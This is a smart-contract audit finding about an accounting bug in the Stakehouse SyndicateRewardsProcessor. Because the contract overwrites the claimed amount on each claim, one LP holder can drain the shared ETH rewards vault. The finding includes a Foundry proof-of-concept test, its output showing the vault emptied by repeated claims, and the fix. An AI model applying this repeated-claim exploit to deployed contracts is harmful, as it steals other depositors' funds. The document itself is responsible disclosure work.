[H-09] Incorrect accounting inSyndicateRewardsProcessorresults in any LP token holder being able to steal other LP tokens holder’s ETH from the fees and MEV vault
Submitted byc7e7eff, also found byTrust,0x4non,arcoun,Jeiwan,unforgiven,cccz,corerouter,rotcivegaf,koxuan,aphak5010,9svR6w,HE1M, andclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88
The SyndicateRewardsProcessor’s internal_distributeETHRewardsToUserForToken()function is called from externalclaimRewards()function in theStakingFundsVaultcontract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.The accumulated rewardsdueare calculated as((accumulatedETHPerLPShare * balance) / PRECISION)reduced by the previous claimed amount stored inclaimed[_user][_token]. When the ETH is sent to the_userthe stored value should be increased by thedueamount. However in the current code base theclaimed[_user][_token]is set equal to the calculateddue.
function_distributeETHRewardsToUserForToken(address_user,address_token,uint256_balance,address_recipient)internal{require(_recipient!=address(0),"Zero address");uint256balance=_balance;if(balance>0) {// Calculate how much ETH rewards the address is owed / dueuint256due= ((accumulatedETHPerLPShare*balance) /PRECISION) -claimed[_user][_token];if(due>0) {claimed[_user][_token] =due;totalClaimed+=due;(boolsuccess, ) =_recipient.call{value:due}("");...}}}
This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in theclaimed[_user][_token].  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.
Proof of Concept
Following modification to the existingStakingFundsVault.t.solwill provide a test to demonstrate the issue:
diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.solindex 53b4ce0..4db8fc8 100644--- a/test/foundry/StakingFundsVault.t.sol+++ b/test/foundry/StakingFundsVault.t.sol@@ -4,6 +4,7 @@ import "forge-std/console.sol";import { StakingFundsVault } from "../../contracts/liquid-staking/StakingFundsVault.sol";import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";+import { SyndicateRewardsProcessor} from "../../contracts/liquid-staking/SyndicateRewardsProcessor.sol";import {TestUtils,MockLSDNFactory,@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {assertEq(vault.totalClaimed(), rewardsAmount);assertEq(vault.totalRewardsReceived(), rewardsAmount);}++    function testRepetitiveClaim() public {+        // register BLS key with the network+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);++        vm.label(accountOne, "accountOne");+        vm.label(accountTwo, "accountTwo");+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));++        // Do a deposit of 24 ETH for savETH pool+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);++        stakeAndMintDerivativesSingleKey(blsPubKeyFour);++        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);++        vm.warp(block.timestamp + 3 hours);++        // Deal ETH to the staking funds vault+        uint256 rewardsAmount = 1.2 ether;+        console.log("depositing %s wei into the vault.\n", rewardsAmount);+        vm.deal(address(vault), rewardsAmount);+        assertEq(address(vault).balance, rewardsAmount);+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);++        logAccounts();++        console.log("Claiming rewards for accountOne.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        console.log("depositing %s wei into the vault.\n", rewardsAmount);+        vm.deal(address(vault), address(vault).balance + rewardsAmount);+        vm.warp(block.timestamp + 3 hours);+        logAccounts();++        console.log("Claiming rewards for accountOne.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        console.log("Claiming rewards for accountOne AGAIN.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        console.log("Claiming rewards for accountOne AGAIN.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        //console.log("Claiming rewards for accountTwo.\n");+        vm.prank(accountTwo);+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));++    }++    function logAccounts() internal {+        console.log("accountOne previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));+        console.log("accountOne claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));+        console.log("accountTwo previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));+        console.log("accountTwo claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));+        console.log("ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\n", accountOne.balance, accountTwo.balance, address(vault).balance);+    }+}
Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.
Following is an output of the test script showing the balances and differnet state variables:
forge test -vv --match testRepetitiveClaim[⠑] Compiling...No files changed, compilation skippedRunning 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)Logs:depositing 1200000000000000000 wei into the vault.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 0accountTwo previewAccumulatedETH : 600000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000Claiming rewards for accountOne.accountOne previewAccumulatedETH : 0accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 600000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000depositing 1200000000000000000 wei into the vault.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000Claiming rewards for accountOne.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000Claiming rewards for accountOne AGAIN.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000Claiming rewards for accountOne AGAIN.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0Test result: FAILED. 0 passed; 1 failed; finished in 15.64msFailing tests:Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)Encountered a total of 1 failing tests, 0 tests succeeded
Tools Used
Manual review / forge test
Recommended Mitigation Steps
TheSyndicateRewardsProcessorcontract should be modified as follows:
diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.solindex 81be706..9b9c502 100644--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {// Calculate how much ETH rewards the address is owed / dueuint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];if (due > 0) {-                claimed[_user][_token] = due;+                claimed[_user][_token] += due;totalClaimed += due;
vince0656 (Stakehouse) confirmed